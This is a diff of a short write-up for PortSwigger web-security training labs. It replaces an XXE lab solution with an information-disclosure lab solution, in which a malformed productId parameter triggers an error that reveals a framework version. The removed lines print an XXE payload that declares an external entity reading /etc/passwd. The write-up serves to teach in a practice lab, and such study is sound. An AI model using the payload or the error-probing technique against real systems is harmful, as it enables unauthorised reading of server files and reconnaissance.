@@ -1,19 +1,17 @@
-# Lab: Exploiting XXE using external entities to retrieve files
+# Lab: Information disclosure in error messages
 
-**Link**: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+**Link**: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages
 
 **Solution**:
-just inject entity 
+We will try to cause error in query parameter,
 
-```xml
-<!DOCTYPE foo [
-<!ENTITY test SYSTEM "file:///etc/passwd" >
-]>
-```
+instead of `/product?productId=3` to be `/product?productId=asdasdasdas`
 
 <p align="center" width="100%">
   <img src="image1.png" width="800" hight="500"/>
 </p>
+
+past this `Apache Struts 2 2.3.31` to the solution
 
 <p align="center" width="100%">
   <img src="image2.png" width="800" hight="500"/>
